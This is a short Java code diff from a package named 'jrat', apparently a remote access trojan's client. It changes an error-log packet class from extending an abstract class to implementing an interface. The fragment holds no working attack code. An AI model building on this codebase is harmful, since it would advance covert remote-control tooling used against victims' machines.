@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet65ErrorLog extends AbstractOutgoingPacket {
+public class Packet65ErrorLog implements OutgoingPacket {
 
 	private String error;
 
